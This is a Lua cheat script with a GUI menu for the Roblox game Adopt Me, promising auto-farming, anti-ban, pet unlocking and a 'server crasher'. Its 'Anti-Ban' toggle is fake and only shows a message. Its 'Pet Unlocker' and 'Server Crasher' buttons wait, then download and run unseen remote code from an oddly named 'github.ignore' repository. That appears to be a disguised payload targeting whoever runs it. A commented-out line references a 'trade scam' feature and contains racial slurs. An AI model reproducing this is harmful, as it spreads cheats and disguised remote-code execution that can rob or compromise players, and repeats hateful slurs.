--gui
local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("Metter X!", "Default")	
local tab1 = DrRayLibrary.newTab("AUTO", "ImageIdHere")
tab1.newLabel("[PREMIUM AUTO FARM SCRIPT FOR ADOPT ME]")
tab1.newLabel("Auto Buy Eggs and Auto Hatch All of your Eggs!")
tab1.newLabel("Auto Play Minigames to farm Bucks!")
tab1.newLabel("Auto Grow Pets to Adult!")
tab1.newButton("ReQiuYTPL Hub", "Runs ReQiuYTPL Hub! (Auto Farm, Auto Trade and More!)", function()
	game.StarterGui:SetCore("SendNotification", {
		Title = "Starting ReQiuYTPL Hub...",
		Text = "Enjoy!",
		Icon = "rbxassetid://2663933748",
		Duration = 3
	})
	wait(2)
	loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
end)
tab1.newToggle("Anti-Ban", "Anti-Ban by changing server-side UserID", false, function(toggleState)
    if toggleState then
        game.StarterGui:SetCore("SendNotification", {
			Title = "Anti-Ban",
			Text = "FireRemoteEvent.BanUser = false",
			Icon = "rbxassetid://2663933748",
			Duration = 5
		})
    else
		wait(2)
        game.StarterGui:SetCore("SendNotification", {
			Title = "Anti-Ban",
			Text = "Not Suggested.",
			Icon = "rbxassetid://2663933748",
			Duration = 5
		})
    end
end)
tab1.newToggle("Anti-Afk", "Anti-Afk by doing random VirtualInputs()", false, function(toggleState)
    if toggleState then
		game.StarterGui:SetCore("SendNotification", {
			Title = "ANTI-AFK",
			Text = "Anti AFK - ON.",
			Icon = "rbxassetid://2663933748",
			Duration = 5
		})		
    else
		wait(2)
		game.StarterGui:SetCore("SendNotification", {
			Title = "ANTI-AFK",
			Text = "Anti AFK - OFF.",
			Icon = "rbxassetid://2663933748",
			Duration = 5
		})
    end
end)
local tab2 = DrRayLibrary.newTab("PREMIUM", "ImageIdLogoHere")
tab2.newLabel("THIS FEATURE IS ONLY FOR THOSE WHO ARE WORTHY, AND BOUGHT THE PREMIUM SCRIPT THROUGH DISCORD SERVER!")
tab2.newLabel("Features: Pet Property Changer, Server Crasher to Lag Trade, Dupe High Value Pets[UNSTABLE] and More!")

tab2.newButton("LOCKED [PET SPOOFER]", "Spoof your pet to any pet!", function()
	game.StarterGui:SetCore("SendNotification", {
		Title = "[ULTRA PREMIUM FEATURES]",
		Text = "UNLOCK ULTRA PREMIUM FEATURES",
		Icon = "rbxassetid://2663933748",
		Duration = 3
	})
end)

tab2.newButton("UNLOCKED [SLOW-SERVER CRASHER]", "AFFECTS SERVER IN 3 Minutes.", function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "SERVER IS CRASHING",
        Text = "SERVER IS CRASHING\nServer might lag a bit...",
        Icon = "rbxassetid://2663933748",
        Duration = 200
    })
    wait(200)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Metter-X/github.ignore/refs/heads/MXScripts/ignore%23"))()
	wait(30)
    game:GetService("Players").LocalPlayer:Kick("\nServer is restarting...")
end)

tab2.newButton("UNLOCKED [Pet Unlocker]", "ONLY ONE USAGE TAKES TIME TO TAKE EFFECT.", function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Unlocking Pets...",
        Text = "Effect in 1 minute...\nGame might lag a bit..",
        Icon = "rbxassetid://2663933748",
        Duration = 60  -- Notification duration
    })
    wait(60)  -- Wait 20 seconds before executing
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Metter-X/github.ignore/refs/heads/MXScripts/ignore"))()
end)
tab2.newInput("Input secret key...", "SUBSCRIBE TO THE CHANNEL", function()
    game.StarterGui:SetCore("SendNotification", {
		Title = "[ULTRA PREMIUM FEATURES]",
		Text = "Wrong key!",
		Icon = "rbxassetid://2663933748",
		Duration = 2
	})
end)
local tab3 = DrRayLibrary.newTab("Credits", "ImageIdLogoHere")
tab3.newLabel("If you find any bugs or issues with the script message me on Discord!")
tab3.newButton("Adopt Me! [Freemium Script by Metter X Hub]", "More Freemium scripts to come!")
tab3.newButton("Join my Discord Server and DM me!", "If you have any issues or want to inquire for the Premium Feature!", function()
    setclipboard("https://discord.gg/4P7zzTJtM2")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Copied to Clipboard",
        Text = "Discord link has been copied!",
        Duration = 5,
    })
end)
tab3.newButton("Credits to @sudo_kai", "Creator of this amazing GUI and the Script!")
tab3.newButton("Metter X_On_Top!", "Subscribe to my YT Channel for script showcase!", function()
	setclipboard("https://www.youtube.com/@MetterX_on_Top")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Copied to Clipboard",
        Text = "Youtube Channel link has been copied!",
        Duration = 5,
    })
end)
tab3.newButton("Developers", "Metter X & @sudo_kai")
--tab2.newDropdown("Dropdown", "drop down shit for gettign playercount and pick player to trade scam very op wowowowoow", {"nigger", "nigga", "uhh"}, function(selectedOption)
--    print(selectedOption)
--end)